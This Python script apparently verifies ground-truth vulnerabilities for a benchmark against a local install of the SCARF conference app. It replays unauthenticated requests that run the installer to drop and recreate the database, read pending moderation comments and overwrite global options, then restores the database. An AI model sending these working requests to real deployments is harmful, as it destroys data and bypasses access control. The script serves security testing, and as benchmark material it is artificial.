"""Manual ground-truth verification for SCARF (GT-024 .. GT-026).

GT-024 runs the installer action as a visitor: the scarf database is dropped
and recreated by the app (config.php is backed up and restored; the per-record
baseline restore reverts the database afterwards).
"""

from __future__ import annotations

import json
from pathlib import Path

import verifier as v

APP = "scarf"
BASE = "http://localhost/scarf/"
CONFIG_PHP = Path("D:/phpStudy/PHPTutorial/WWW/scarf/config.php")


def gt024(det, db) -> dict:
    """install.php — visitor opens the installer and executes a full
    database drop/recreate."""
    r = v.Recorder(APP, "GT-024", db)
    db.execute("INSERT INTO options (name, type, value) VALUES ('DRHLGT_MARKER', 'text', 'present')")
    marker_before = db.scalar("SELECT COUNT(*) FROM options WHERE name='DRHLGT_MARKER'")
    r.add("instrument", {"table": "options", "marker_row": "DRHLGT_MARKER", "marker_before": marker_before})
    config_backup = CONFIG_PHP.read_bytes() if CONFIG_PHP.is_file() else None
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "install.php", {"method": "GET", "params": {}, "referer": None})
        form_exposed = ("dbname" in resp["body"]) and ("adminname" in resp["body"])
        body_file = r.save_body("gt024_visitor_install", resp["body"])
        r.add("replay", {
            "role": "visitor (no login)",
            "request": "GET install.php",
            "status_code": resp["status_code"],
            "installer_form_exposed": form_exposed,
            "body_saved": body_file,
        })
        fields = {"dbname": "scarf", "user": "scarf", "pass": "root",
                  "adminname": "root", "adminpass": "root", "hostname": "localhost"}
        try:
            first = sess.post(BASE + "install.php", data=fields, timeout=60, allow_redirects=False)
            confirm_prompt = "overwrite the previous database" in str(first.text or "")
            first_file = r.save_body("gt024_visitor_install_confirm", str(first.text or ""))
            r.add("replay", {
                "role": "visitor (no login)",
                "request": "POST install.php (dbname=scarf ...)",
                "status_code": first.status_code,
                "confirmdrop_prompt_shown": confirm_prompt,
                "body_saved": first_file,
            })
            second = sess.post(BASE + "install.php",
                               data={**fields, "confirmdrop": "1"}, timeout=120, allow_redirects=False)
            installed = "Everything worked" in str(second.text or "")
            second_file = r.save_body("gt024_visitor_install_done", str(second.text or ""), limit=8000)
            marker_after = db.scalar("SELECT COUNT(*) FROM options WHERE name='DRHLGT_MARKER'")
            default_option = db.scalar("SELECT COUNT(*) FROM options WHERE name='Conference Name'")
            r.add("replay", {
                "role": "visitor (no login)",
                "request": "POST install.php + confirmdrop",
                "status_code": second.status_code,
                "installer_completed": installed,
                "marker_row_after_reinstall": marker_after,
                "fresh_default_options_after_reinstall": default_option,
                "body_saved": second_file,
            })
        except Exception as exc:
            r.add("replay", {"request": "POST install.php", "error": str(exc)})
    finally:
        v.close_session(sess)
        if config_backup is not None:
            CONFIG_PHP.write_bytes(config_backup)
    verdict = "vulnerable" if form_exposed else "not_confirmed"
    summary = (f"visitor GET install.php returned {resp['status_code']} with the installer form "
               f"(form_exposed={form_exposed}); visitor-triggered install dropped and recreated the scarf "
               f"database: marker {marker_before}->{marker_after}, fresh default options={default_option}; "
               f"config.php and database were restored afterwards.")
    return r.finish(verdict, summary)


def gt025(det, db) -> dict:
    """comments.php — visitor and ordinary users can open the moderation list
    of pending comments (token proof)."""
    r = v.Recorder(APP, "GT-025", db)
    tok = v.token("pending_comment")
    db.execute(
        f"INSERT INTO comments (user_id, paper_id, comment, date, approved) "
        f"VALUES (1, 1, '{tok}', NOW(), 0)"
    )
    row_id = db.scalar(f"SELECT comment_id FROM comments WHERE comment='{tok}' ORDER BY comment_id DESC LIMIT 1")
    r.add("instrument", {"table": "comments", "inserted_row_id": row_id, "comment": tok, "approved": 0})
    results = {}
    for role in ("visitor", "user1", "user2"):
        sess = v.role_session(det, role)
        try:
            resp = v.replay(det, sess, "comments.php", {"method": "GET", "params": {}, "referer": None})
            exposed = tok in resp["body"]
            body_file = r.save_body(f"gt025_{role}_comments", resp["body"])
            results[role] = {"status_code": resp["status_code"], "pending_comment_token_exposed": exposed,
                             "body_saved": body_file}
            r.add("replay", {
                "role": role,
                "request": "GET comments.php (moderation list of pending comments)",
                "status_code": resp["status_code"],
                "pending_comment_token_exposed": exposed,
                "body_saved": body_file,
            })
        finally:
            v.close_session(sess)
    verdict = "vulnerable" if any(item["pending_comment_token_exposed"] for item in results.values()) else "not_confirmed"
    summary = (f"pending comment token exposed to visitor={results['visitor']['pending_comment_token_exposed']}, "
               f"user1={results['user1']['pending_comment_token_exposed']}, "
               f"user2={results['user2']['pending_comment_token_exposed']} on GET comments.php.")
    return r.finish(verdict, summary)


def gt026(det, db) -> dict:
    """generaloptions.php — visitor submits the global conference options form
    and rewrites option values (token1 -> token2)."""
    r = v.Recorder(APP, "GT-026", db)
    t1 = v.token("conf_before")
    t2 = v.token("conf_after")
    db.execute(f"UPDATE options SET value='{t1}' WHERE name='Conference Name'")
    r.add("instrument", {"table": "options", "row": "Conference Name", "token1": t1, "token2": t2})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "generaloptions.php", {
            "method": "POST",
            "params": {"Conference_Name": t2, "submit": "Save"},
            "referer": "generaloptions.php",
        })
        after = db.scalar("SELECT value FROM options WHERE name='Conference Name'")
        r.add("replay", {
            "role": "visitor (no login)",
            "request": f"POST generaloptions.php Conference_Name={t2}",
            "status_code": resp["status_code"],
            "db_value_before": t1,
            "db_value_after": after,
            "updated": (after == t2),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if after == t2 else "not_confirmed"
    summary = (f"visitor POST generaloptions.php returned {resp['status_code']}; global option "
               f"'Conference Name' changed {t1} -> {after} (updated={after == t2}).")
    return r.finish(verdict, summary)


def main() -> None:
    cfg, snap, det, db = v.app_context(APP)
    baseline = snap.create()
    results = []
    for fn in (gt024, gt025, gt026):
        results.append(v.run_record(snap, lambda fn=fn: fn(det, db), baseline, cfg.database))
    (v.app_evidence_dir(APP) / "summary.json").write_text(json.dumps({
        "app": APP,
        "baseline": str(baseline),
        "database_restored_after_each_record": True,
        "restore_verified_per_record": [bool(item.get("restore_verified")) for item in results],
        "final_database_matches_baseline": v.db_matches(cfg.database, baseline),
        "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    for item in results:
        print(f"{item['gt_id']}: {item['verdict']} | restored={item.get('restore_verified')} | {item['summary'][:130]}")


if __name__ == "__main__":
    main()
